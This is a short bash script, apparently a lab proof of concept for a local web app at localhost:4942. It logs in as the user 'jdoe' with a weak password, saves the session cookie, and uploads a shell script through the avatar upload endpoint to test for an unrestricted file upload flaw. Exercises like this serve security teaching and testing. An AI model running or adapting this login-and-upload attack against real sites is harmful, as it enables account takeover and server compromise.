#!/usr/bin/bash

make_blue() {
  echo -e "\033[1;94m$1\033[1;0m"
}

make_green() {
  echo -e "\033[1;92m$1\033[1;0m"
}

domain="http://localhost:4942"
hacked_joe="jdoe@student.42.tech"
password="123123"
location=$(curl -X POST "$domain"/login \
    -s \
    -w "%{redirect_url}" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "identity=$hacked_joe&password=$password" \
    -c cookie.txt);

if [[ $location == "$domain/" ]]; then 
    echo "$(make_green SUCCESS!) Logged in as joe.."
else
    echo "Were not able to login as joe...😔"
    exit 1
fi

url="http://localhost:4942/upload/avatar"
location=$(curl -X POST $url \
    -w "%{redirect_url}" \
    -s \
    -F "file=@./unrestricted_upload.sh" \
    -b cookie.txt);
echo $location
